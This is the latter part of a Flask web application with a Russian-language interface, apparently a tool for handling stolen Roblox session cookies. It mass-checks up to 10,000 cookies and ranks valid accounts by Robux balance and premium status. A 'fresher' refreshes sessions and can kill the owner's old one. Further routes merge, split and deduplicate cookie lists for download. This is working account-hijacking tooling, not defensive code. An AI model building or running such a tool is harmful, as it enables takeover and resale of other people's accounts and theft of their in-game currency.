        if (d.success && d.only_cookies) { resBox.textContent = d.only_cookies; loadFresherHistory(); }
        else { resBox.textContent = '❌ ' + (d.message || 'Не удалось'); }
    } catch(e) { resBox.textContent = '❌ ' + e.message; }
}

function clearFresherInputs() {
    document.getElementById('fresherCookies').value = '';
    document.getElementById('fresherResult').textContent = 'Новые куки здесь...';
}

async function loadCheckerHistory() {
    var container = document.getElementById('checkerHistoryList');
    try {
        var r = await fetch('/api/history/checker'); var d = await r.json();
        if (d.history && d.history.length > 0) {
            var html = '';
            d.history.slice().reverse().forEach(function(item) {
                var typeLabel = item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная';
                html += '<div class="history-item" onclick="var x=this.querySelector(\'.hist-detail\');if(x.style.display==\'none\'){x.style.display=\'block\'}else{x.style.display=\'none\'}">';
                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + typeLabel + ' | ✅ ' + item.valid + '/' + item.total + '</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n---\n') : 'Нет данных') + '</div></div>';
            });
            container.innerHTML = html;
        } else { container.innerHTML = '<div class="empty-history">📭 История пуста</div>'; }
    } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
}

async function clearCheckerHistory() {
    if (!confirm('Удалить историю?')) return;
    await fetch('/api/history/checker/clear', { method: 'POST' });
    loadCheckerHistory();
}

async function loadFresherHistory() {
    var container = document.getElementById('fresherHistoryList');
    try {
        var r = await fetch('/api/history/fresher'); var d = await r.json();
        if (d.history && d.history.length > 0) {
            var html = '';
            d.history.slice().reverse().forEach(function(item) {
                var ml = item.mode === 'kill' ? '💀 Сброс' : '♻️ Дублирование';
                html += '<div class="history-item" onclick="var x=this.querySelector(\'.hist-detail\');if(x.style.display==\'none\'){x.style.display=\'block\'}else{x.style.display=\'none\'}">';
                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + ml + ' | ' + item.refreshed_count + ' шт.</span></div>';
                html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n') : 'Нет данных') + '</div></div>';
            });
            container.innerHTML = html;
        } else { container.innerHTML = '<div class="empty-history">📭 История пуста</div>'; }
    } catch(e) { container.innerHTML = '<div class="empty-history">❌ Ошибка</div>'; }
}

async function clearFresherHistory() {
    if (!confirm('Удалить историю?')) return;
    await fetch('/api/history/fresher/clear', { method: 'POST' });
    loadFresherHistory();
}

async function mergeCookies() {
    var files = document.getElementById('mergeFiles').files;
    if (!files || files.length < 2) { document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла'; return; }
    var fd = new FormData(); Array.from(files).forEach(function(f) { fd.append('files', f); });
    document.getElementById('mergeResult').textContent = '⏳ Объединение...';
    try {
        var r = await fetch('/api/merge-cookies', { method: 'POST', body: fd }); var d = await r.json();
        document.getElementById('mergeResult').innerHTML = d.success ? '✅ ' + d.total_files + ' файлов | 📊 ' + d.total_cookies + ' куки<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('mergeResult').textContent = '❌ ' + e.message; }
}

async function splitByCount() {
    var content = window.splitCountContent; var count = parseInt(document.getElementById('splitCount').value);
    if (!content) { document.getElementById('splitCountResult').textContent = '❌ Загрузите файл'; return; }
    document.getElementById('splitCountResult').textContent = '⏳ Разделение...';
    try {
        var r = await fetch('/api/split-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content, split_type: 'count', count: count }) });
        var d = await r.json();
        document.getElementById('splitCountResult').innerHTML = d.success ? '✅ ' + d.file_count + ' файлов<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('splitCountResult').textContent = '❌ ' + e.message; }
}

async function splitByFiles() {
    var content = window.splitFilesContent; var num = parseInt(document.getElementById('splitFilesCount').value);
    if (!content) { document.getElementById('splitFilesResult').textContent = '❌ Загрузите файл'; return; }
    document.getElementById('splitFilesResult').textContent = '⏳ Разделение...';
    try {
        var r = await fetch('/api/split-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content, split_type: 'files', count: num }) });
        var d = await r.json();
        document.getElementById('splitFilesResult').innerHTML = d.success ? '✅ ' + num + ' файлов<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>' : '❌ Ошибка';
    } catch(e) { document.getElementById('splitFilesResult').textContent = '❌ ' + e.message; }
}

async function cleanCookies(action) {
    var content = document.getElementById('cleanCookiesInput').value.trim();
    if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
    document.getElementById('cleanResult').textContent = '⏳ Обработка...';
    try {
        var r = await fetch('/api/clean-cookies', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content, action: action }) });
        var d = await r.json();
        if (d.success) {
            var txt = '✅ Было: ' + d.original_count + ' | Стало: ' + d.processed_count;
            if (d.duplicates_removed > 0) txt += '<br>🗑️ Удалено: ' + d.duplicates_removed;
            txt += '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
            document.getElementById('cleanResult').innerHTML = txt;
        } else { document.getElementById('cleanResult').textContent = '❌ Ошибка'; }
    } catch(e) { document.getElementById('cleanResult').textContent = '❌ ' + e.message; }
}

loadCheckerHistory();
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api/extract-preview", methods=["POST"])
def api_extract_preview():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    return jsonify({"success": True, "count": len(extract_cookies_from_text(content))})

@app.route("/api/single-check", methods=["POST"])
def api_single_check():
    data = request.json or {}
    cookie = data.get("cookie", "").strip()
    if not cookie: return jsonify({"success": False, "message": "Кук не предоставлен"})
    info = get_full_info(cookie)
    report = format_full_report(info)
    add_checker_history({'type': 'single', 'total': 1, 'valid': 1 if info['status']=='✅' else 0, 'cookies': [report]})
    return jsonify({"success": True, "report": report})

@app.route("/api/mass-check", methods=["POST"])
def api_mass_check():
    content = ""
    if 'file' in request.files: content = request.files['file'].read().decode('utf-8', errors='ignore')
    if not content: return jsonify({"success": False, "message": "Файл не предоставлен"})
    cookies = extract_cookies_from_text(content)
    extracted_count = len(cookies)
    if not cookies: return jsonify({"success": False, "message": "Куки не найдены"})
    if len(cookies) > 10000: cookies = cookies[:10000]
    results = mass_check(cookies)
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    formatted = [format_quick_report(r) for r in results]
    premium_count = sum(1 for r in valid if r.get('is_premium'))
    total_robux = sum(r.get('robux',0) for r in valid)
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"mass_check_{timestamp}.txt"
    filepath = os.path.join("downloads", filename)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(f"📊 РЕЗУЛЬТАТЫ | {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
        f.write(f"Извлечено: {extracted_count} | Проверено: {len(results)} | ✅{len(valid)} | ❌{len(invalid)}\n")
        f.write(f"Premium: {premium_count} | Robux: {total_robux:,}\n\n")
        for r in valid:
            score = r.get('score',0)
            rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else "🟢"))
            f.write(f"{rank} {r['username']} [{r['user_id']}] | ⏣{r['robux']:,} | Score:{score}\n{r['cookie']}\n\n")
        if invalid:
            f.write("\n❌ НЕВАЛИДНЫЕ:\n")
            for r in invalid: f.write(f"{r['cookie']}\n")
    
    download_url = f"/downloads/{filename}"
    add_checker_history({'type': 'mass', 'total': len(results), 'valid': len(valid), 'cookies': formatted[:20], 'download_url': download_url})
    return jsonify({"success": True, "extracted_count": extracted_count, "total": len(results), "valid_count": len(valid), "invalid_count": len(invalid), "premium_count": premium_count, "total_robux": total_robux, "results": formatted, "download_url": download_url})

@app.route("/api/fresher", methods=["POST"])
def api_fresher():
    data = request.json or {}
    raw = data.get("cookies", "")
    mode = data.get("mode", "duplicate")
    cookies_list = extract_cookies_from_text(raw)
    if not cookies_list: return jsonify({"success": False, "message": "Куки не найдены"})
    only_cookies = []; cookie_hist = []
    for c in cookies_list:
        result = refresh_roblox_cookie(c, kill_old=(mode=='kill'))
        if result['success'] and result['new_cookie']:
            cookie_hist.append(f"🟢 {result.get('username','?')} - НОВАЯ")
            only_cookies.append(result['new_cookie'])
        else: cookie_hist.append("❌ Ошибка")
    add_fresher_history({'mode': mode, 'refreshed_count': len(only_cookies), 'cookies': cookie_hist})
    return jsonify({"success": True, "refreshed_count": len(only_cookies), "only_cookies": '\n'.join(only_cookies) if only_cookies else ''})

@app.route("/api/history/checker")
def api_history_checker():
    return jsonify({"history": load_history(CHECKER_HISTORY_FILE)})

@app.route("/api/history/fresher")
def api_history_fresher():
    return jsonify({"history": load_history(FRESHER_HISTORY_FILE)})

@app.route("/api/history/checker/clear", methods=["POST"])
def api_clear_checker_history():
    save_history(CHECKER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/history/fresher/clear", methods=["POST"])
def api_clear_fresher_history():
    save_history(FRESHER_HISTORY_FILE, [])
    return jsonify({"success": True})

@app.route("/api/merge-cookies", methods=["POST"])
def api_merge_cookies():
    if 'files' not in request.files: return jsonify({"success": False})
    files = request.files.getlist('files')
    if len(files) < 2: return jsonify({"success": False, "message": "Минимум 2 файла"})
    contents = [f.read().decode('utf-8', errors='ignore') for f in files]
    merged = merge_cookie_files(contents)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"merged_{timestamp}.txt"
    with open(os.path.join("downloads", filename), 'w') as f: f.write(merged)
    all_lines = [l for l in merged.split('\n') if l]
    return jsonify({"success": True, "total_files": len(files), "total_cookies": len(all_lines), "download_url": f"/downloads/{filename}"})

@app.route("/api/split-cookies", methods=["POST"])
def api_split_cookies():
    data = request.json or {}
    content = data.get("content", ""); split_type = data.get("split_type", "count"); count = data.get("count", 100)
    if not content: return jsonify({"success": False})
    files = split_cookies_by_count(content, count) if split_type=="count" else split_cookies_by_files(content, count)
    if not files: return jsonify({"success": False})
    zip_buffer = BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
        for i, fc in enumerate(files, 1): zf.writestr(f"part_{i}.txt", fc)
    zip_buffer.seek(0)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    archive_name = f"split_{timestamp}.zip"
    with open(os.path.join("downloads", archive_name), 'wb') as f: f.write(zip_buffer.getvalue())
    return jsonify({"success": True, "file_count": len(files), "download_url": f"/downloads/{archive_name}"})

@app.route("/api/clean-cookies", methods=["POST"])
def api_clean_cookies():
    data = request.json or {}
    content = data.get("content", ""); action = data.get("action", "deduplicate")
    if not content: return jsonify({"success": False})
    orig = [l for l in content.split('\n') if l.strip()]
    processed = remove_duplicates(content) if action=="deduplicate" else clean_cookies(content)
    proc = [l for l in processed.split('\n') if l.strip()]
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"cleaned_{timestamp}.txt"
    with open(os.path.join("downloads", filename), 'w') as f: f.write(processed)
    return jsonify({"success": True, "original_count": len(orig), "processed_count": len(proc), "duplicates_removed": len(orig)-len(proc), "download_url": f"/downloads/{filename}"})

@app.route("/downloads/<filename>")
def download_file(filename):
    return send_from_directory("downloads", filename, as_attachment=True)

if __name__ == "__main__":
    app.run(debug=True, port=5000)
